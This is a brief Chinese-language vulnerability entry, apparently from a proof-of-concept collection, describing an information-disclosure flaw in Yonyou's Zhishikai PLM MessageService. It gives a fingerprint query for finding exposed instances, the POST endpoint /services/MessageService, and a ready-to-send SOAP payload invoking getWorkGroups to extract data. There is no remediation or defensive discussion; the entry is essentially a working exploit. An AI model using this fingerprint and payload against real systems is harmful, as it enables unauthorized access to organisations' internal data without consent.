# 用友智石开PLMMessageService存在信息泄露漏洞

用友 ｜ 信息泄露 ｜ —
- **指纹**：`body="智石开PLM"`
- **请求**：`POST /services/MessageService HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mes="MessageService">
<soapenv:Header/>
<soapenv:Body>
<mes:getWorkGroups/>
</soapenv:Body>
</soapenv:Envelope>
```